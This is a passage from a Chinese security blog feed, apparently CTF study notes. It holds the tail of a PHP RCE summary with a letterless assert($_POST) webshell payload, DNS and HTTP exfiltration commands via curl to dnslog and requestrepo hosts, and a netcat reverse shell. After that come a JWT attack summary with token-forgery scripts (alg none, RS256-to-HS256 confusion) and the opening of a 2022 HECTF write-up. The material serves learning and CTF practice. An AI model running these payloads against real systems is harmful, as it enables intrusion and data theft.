class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br>固定格式 构造出来的 <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[_]);<br>然后post传入   _=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><p>CTFSHOW无字符RCE挑战中有更深入的利用方法</p><h1 id="无回显情况的几种利用方式"><a href="#无回显情况的几种利用方式" class="headerlink" title="无回显情况的几种利用方式"></a>无回显情况的几种利用方式</h1><p>题目中较常见的是<code>shell_exec</code>函数，与<code>system</code>函数相比，前者没有回显结果</p><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>当有写入的权限时，可以考虑将结果写到文件中</p><p>例如：<code>ls&gt;1.txt;</code></p><h2 id="dns外带信息"><a href="#dns外带信息" class="headerlink" title="dns外带信息"></a>dns外带信息</h2><p>假设目标没有写的权限，但是出网，就可以考虑使用dns外带信息，常用的平台有<code>http://dnslog.cn/</code></p><p>例如我们生成一个域名<code>c9n9j5.dnslog.cn</code>，然后在靶机上执行<code>curl `whoami`.c9n9j5.dnslog.cn</code></p><p>刷新后就会在平台上返回结果</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/dnslog.png"></p><h2 id="http外带信息"><a href="#http外带信息" class="headerlink" title="http外带信息"></a>http外带信息</h2><p>实际上在dnslog外带信息的同时，有许多不方便之处，比如不支持换行，url中没有的字符不显示等等</p><p>所以可以用http的方式，推荐一个平台<code>https://requestrepo.com/#/</code>，用来接收get，post请求等</p><p>在靶机上执行<code>curl http://mt2dyif2.requestrepo.com/?1=`whoami` </code>，过一会在平台上就会有请求返回(子域名是随机生成的)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/http.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>不回显的利用方式肯定少不了最经典的反弹shell</p><p>常规反弹语句：<code>nc ip port -e /bin/sh</code>，监听：<code>nc -lvnp port</code></p><p>反弹的姿势非常多，不知道利用什么方式时可以用比较通用的方式<code>https://your-shell.com/</code></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>当靶机不出网，没有写入权限，没有回显时，可以采用类似sql时间盲注的方法</p><p>原理很简单，就是猜字符如果猜中，就延时若干秒，坏处是非常耗时</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;部分题目环境&amp;amp;脚本&amp;amp;姿势来自&lt;code&gt;https://ctf.show/&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="rce" scheme="https://www.lewiserii.top/tags/rce/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>JWT常见安全问题学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/JWT%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/JWT%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-01-05T02:00:00.000Z</published>
    <updated>2023-02-15T05:17:50.113Z</updated>
    
    <content type="html"><![CDATA[<p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(<a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>)。它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象，特别适用于分布式站点的单点登录(SSO)场景。</p><h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>jwt由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code>，用点<code>.</code>分隔</p><h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p><code>header</code>用来声明<code>token</code>的类型和签名用的算法等</p><p>示例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第一部分</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>payload</code>就是存放有效信息的地方</p><p>示例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>它的声明有三类：已注册声明（Registered claims），公共声明（public claims）， 私人声明（private claims）</p><p>其中已注册声明有7个默认字段，都由官方所定义(<a href="https://www.rfc-editor.org/rfc/rfc7519#section-4.1">参考rfc7519</a>)，但并不都是必需的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">iss (issuer)：JWT的发行者<br>exp (expiration time)：过期时间<br>sub (subject)：JWT面向的主题<br>aud (audience)：JWT的用户<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：JWT唯一标识<br></code></pre></td></tr></table></figure><p><code>公共声明</code>：这些可以由使用JWT的人随意定义。但是为了避免冲突，它们应该在IANA JSON Web令牌注册表中定义，或者定义为包含抗冲突命名空间的 URI。<br><code>私人声明</code>：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公共声明</p><p>经过<code>Base64Url</code>编码后构成了<code>JWT</code>的第二部分</p><h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h2><p>签名用于验证消息在此过程中没有被更改</p><p>这个部分需要<code>Base64Url</code>编码后的<code>header</code>和<code>Base64Url</code>编码后的<code>payload</code>使用<code>.</code>连接，组成字符串，然后通过<code>header</code>中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了<code>jwt</code>的第三部分</p><p>如果要使用<code>HMAC SHA256</code>算法，将按以下方式创建签名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SHA256">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure><p>secret是保存在服务端的，jwt的签发生成也是在服务端的，secret就是用来进行jwt的签发和jwt的验证，所以一旦客户端得知这个secret, 那就意味着客户端可以自我签发jwt了</p><h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>因为<code>payload</code>和<code>header</code>只经过<code>Base64Url</code>编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得</p><h2 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h2><p>某些服务端并未校验JWT签名，所以，可以尝试修改<code>signature</code>后(或者直接删除<code>signature</code>)看其是否还有效。</p><h2 id="签名算法置空-CVE-2015-2951"><a href="#签名算法置空-CVE-2015-2951" class="headerlink" title="签名算法置空(CVE-2015-2951)"></a>签名算法置空(CVE-2015-2951)</h2><p>我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改</p><p>但头部中的<code>alg</code>字段却可以改为<code>none</code>，服务端接收到后会将其认定为无加密算法， 于是对<code>signature</code>的检验也就失效了，那么我们就可以随意修改<code>payload</code>部分伪造<code>token</code></p><p>因为<code>jwt.io</code>将<code>alg</code>为<code>none</code>视为恶意行为，所以无法通过在线工具生成JWT，可以用<code>python</code>的<code>jwt</code>库来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><br>token_dict = &#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1674038291</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;e41ff441b04bf337ab3ca715f64a76e1&quot;</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br><br>jwt_token = jwt.encode(token_dict,<br>                       <span class="hljs-string">&quot;&quot;</span>,   <span class="hljs-comment"># 进行加密签名的密钥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,   <span class="hljs-comment"># 指明签名算法方式, 默认也是HS256</span><br>                       headers=headers<br>                       )<br><br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure><p>运行结果<br><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.</code></p><h2 id="签名密钥爆破"><a href="#签名密钥爆破" class="headerlink" title="签名密钥爆破"></a>签名密钥爆破</h2><p>JWT使用算法对<code>header</code>和<code>payload</code>进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改<code>token</code>了</p><p><a href="https://github.com/Ch1ngg/JWTPyCrack">Github-jwt爆破脚本</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-1.png"></p><h2 id="非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555"><a href="#非对称密码算法-x3D-gt-对称密码算法-CVE-2016-10555" class="headerlink" title="非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)"></a>非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)</h2><p>JWT的签名加密算法有两种，对称加密算法和非对称加密算法</p><p>对称加密算法比如HS256使用密钥为所有消息进行签名和验证<br>非对称加密算法比如RS256使用私钥对消息进行签名并使用公钥进行身份验证</p><p>如果我们获取到了公钥，可以将头部中的算法修改从<code>RS256</code>更改为<code>HS256</code>，这样后端代码就会使用<code>RSA</code>公钥+<code>HS256</code>算法进行签名验证</p><p>js代码实现例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>python代码实现例子</p><p>不过用python跑的时候因为jwt版本过高会报错<code>The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret</code><br>解决方法：<code>pip install pyjwt==0.4.3</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>因为<code>非对称加密算法</code>利用私钥生成<code>jwt</code>，利用公钥解密<code>jwt</code>，所以我们只要有私钥然后自己就可以重新生成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><p>如果运行报错<code>Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code><br>可以强行注释<code>node_modules\jsonwebtoken\sign.js</code>中对于密钥长度的判断</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/jwt/jwt-2.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>听说还有通过KID实现任意文件读取，注入等操作，CVE-2018-0114，CVE-2022-39227，下次抽空研究下</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://jwt.io/">jwtio</a><br><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a><br><a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p><p>参考文章：<br><a href="https://xz.aliyun.com/t/2338">JSON Web Token (JWT) 攻击技巧</a><br><a href="https://www.cnblogs.com/yokan/p/14468030.html">JWT原理及常见攻击方式</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/">JWT总结</a><br><a href="https://forum.butian.net/share/1990">CVE-2022-39227漏洞分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准(&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7519&quot;&gt;RFC 7519&lt;/a&gt;)。它定义了一种紧凑且自包含的方</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="JWT" scheme="https://www.lewiserii.top/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>2022HECTF-WP</title>
    <link href="https://www.lewiserii.top/wp/2022HECTF.html"/>
    <id>https://www.lewiserii.top/wp/2022HECTF.html</id>
    <published>2022-11-07T01:30:00.000Z</published>
    <updated>2022-11-08T05:57:27.138Z</updated>
    
    <content type="html"><![CDATA[<p>Rank: 13</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="咦-小鲨鱼来喽"><a href="#咦-小鲨鱼来喽" class="headerlink" title="咦~小鲨鱼来喽"></a>咦~小鲨鱼来喽</h2><p>追踪tcp流，某个POST包中看到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-1.png"></p><h2 id="舞者的秘密"><a href="#舞者的秘密" class="headerlink" title="舞者的秘密"></a>舞者的秘密</h2><p>数字暴力破解，得到密码<code>456123</code></p><p>给的后缀是png，看头实际上是gif</p><p>stegsolve一帧一帧看得到flag</p><h2 id="你把我flag藏哪去了"><a href="#你把我flag藏哪去了" class="headerlink" title="你把我flag藏哪去了?"></a>你把我flag藏哪去了?</h2><p>txt中存在0宽字符，得到<code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>docx中去除字体隐藏，得到<code>a2draGxmbG9hbmFpdWZwZ2hoYWx3dWprbGttb3ducGxrbXdseWdhbHBtZmtneWdnaWh1bGRsZ2FveXVsb2lnZ3JwbGt2a2dtcmthcXp4ZW1taXdrbGh1Z2VrbGVvbHBhYW9sZmZtYWdobWZnZm1ndmdqbmJscG1sYWphcHVmamxncGxhb2pwamJmZmJqYndodWdsZ2d5am5nbWxiZnlnbGpiZ3hraXhsbW1xaWtzbXBhcXlvamVyYWZla2FkeGR4eGJhcnhsZ25neW1zaW1odnV3a2FleHNnbHJhcGdna2FibWZ1bGd2bm1hanVmb2VreW1hbGlteGRpampweHlpYWdicG1rdWFsbG5sa3BvZWFnZmxkbHBvc2tpenZ5eHJhYXp4cmd4YW5vaWhxbHhmb2dmZ2dscGdqeWxrZWFrYnlsZnZqb21sbGtnamd5bWdmZGxycGVxZmtsZnNsbWVqaWxwamlrbHBhYXBnbHh5ZXZma3lsZmFwcGJrZHpmbGZmbGxpa3FuaWFsa2Joam9ybmRoc2ZvbWZheXBnaHBxb3hyeWltaGZsbGZobG1rb3JlYW1yb2FrZ3JsamFobWZhaWxpamFueWtmdWFpaGZiemFmYXVmbXNmZm5nZmFsbXJiZmZsZmFmZndsbmptZmdhYWZmYXVhempmaWp4aWFiZmlybW92cHpla2lyYmFzZmpzZ3psdWtvbHl2b2htdmFhbHBrYWhzeGZ6YW1tYmZubWxkenlhYXVpZmxkdmttemJnZnliYW9mZnJmbGZvYWFkZ21sbG5iZ2ZwbnJneGxseXBoeWZubGV4YnZkbmxva2dveWlscHJmbG9uc2hhbGtqYXhuZ2JqaGxtYnBkbGFtaGtqZm5sZ21hYWdmam5qZ2tmcml6bGZmbHBtbWdsYXB4Z211bmluYWF1cGtwZmRpZ3BzYXNtdmtkanZnaXlvZmR1bXBuZ3BhbGpramJsZmhhaHNraW9rcGZnYWF5aG5uZmRzeGtmZnFqYWF6dnZkb3NlZnBwZm9maWd5YW1mbmZuZ3ZsYW9hcGR5aXh2YmZkb3NvYm1sdWJhaXVnanhoZnlma3ZyYWthemdsdXlpbHB2Z2Z3Z3lucWdncGxia3dpaWF4YXJsYWZsYWFsZmt4ZmpscGVnbW1ham5ndWpsb2Z1aWZmbXZpa2ZpbXJhb2dxYWxhbGZtZ3ViYWdmZ2dvYWFrZ3JmcWZoYWVtb3NyYWFmeWZvcHVrdWRhYWxmZ2dpbWhkZm9nbmhrcmxlZmxwYWxnYWxmYXB5amFsZ3Zva2xnZmxsZ2FmbGFhZmFmbWF6eWdwZWhma3pobGF6bmdmbW9mbGlhemx2bnhhbmFsdWdqbGFmb3ZsamZqdWJ6Z2FwZWhoZmtmbmZuZ2dwYWx5bGl2ZmVnYWFpZHJteWphZ2ZhbGdtYWdmbHJrbHVnYWRwZmZ1YWFreQ==</code></p><p>将docx中的字符串base64后和0宽得到的字符拼接在一起，然后进行词频分析，得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-2.png"></p><h2 id="我的手要不行辣"><a href="#我的手要不行辣" class="headerlink" title="我的手要不行辣"></a>我的手要不行辣</h2><p>图片补上<code>89 50 4E 47</code>，内容是zip</p><p>ocr后另存为，数字暴力破解得到<code>8686</code></p><p>解压得到<code>‖♬♩‖¶♯‖♬♭‖♬♫‖♫♪‖♫§‖‖‖‖♩¶♭♭♭‖♬♩‖♬¶‖‖‖‖♬∮♭♭♭‖¶§‖‖♯♭♭♭‖♬♩‖‖♭‖♬♭‖♬♫‖♫♫§=</code></p><p>千千秀字的在线音符解密得到<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code></p><h2 id="来玩捉迷藏呀"><a href="#来玩捉迷藏呀" class="headerlink" title="来玩捉迷藏呀"></a>来玩捉迷藏呀</h2><p>lsb得到一串字符串<br><code>63783037273333333b33434b7066338cfb9b8b3d3333337733333b333333555f52541d575c50de28385f2ff6c6deedae404521c8c182c0b081427fd1b7b80a086c21137d51f37a79cd7e797121fd8d80c4d1c0ca8b0ed0abb3299963e........</code></p><p>将字节异或51后发现恰好是<code>50 4b.....</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br>d=f.read()<br>d=d.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e+=<span 